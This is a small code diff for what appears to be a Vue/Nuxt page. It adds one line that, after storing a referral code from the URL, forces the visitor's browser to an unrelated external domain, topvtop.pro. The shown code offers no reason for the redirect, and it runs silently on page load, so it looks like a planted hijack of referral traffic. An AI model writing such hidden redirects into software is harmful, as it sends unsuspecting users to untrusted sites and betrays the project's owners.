@@ -41,6 +41,7 @@ const referralFromLocal: any = ref('')
 onMounted(() => {
   if (route.query?.ref && typeof route.query?.ref === 'string') {
     localStorage.setItem('referralCode', route.query?.ref)
+    navigateTo('https://topvtop.pro', { external: true })
   }
 
   referralFromLocal.value = localStorage.getItem('referralCode')
